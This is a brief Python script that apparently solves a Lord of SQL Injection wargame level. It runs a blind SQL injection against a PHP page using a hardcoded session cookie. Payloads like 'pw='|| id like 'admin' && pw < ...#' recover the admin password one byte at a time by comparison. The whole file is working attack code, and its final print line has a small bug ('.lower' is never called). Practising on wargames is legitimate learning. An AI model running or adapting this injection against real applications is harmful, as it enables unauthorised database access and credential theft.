import requests
import time

URL = "http://los.rubiya.kr/golem_4b5202cfedd8160e73124b5234235ef5.php?"

cookie = {
    "PHPSESSID":"lmvdhntp9agtm6jdhda5jbs0c6"
    }
pw = "0x"
for i in range(8) :
    for j in range(33,127):
        res1 = requests.get(URL+"pw='|| id like 'admin' %26%26 pw < "+pw+hex(j)[2:]+"%23"\
                            ,cookies=cookie)
        print (res1.text.find("Hello admin"))
        time.sleep(0.01) 
        if res1.text.find("Hello admin") > -1:
            pw = pw+hex(j-1)[2:]
            print (pw)
            break
print ("ADMIN's PW : "+bytes.fromhex(pw[2:]).decode('utf-8').lower)
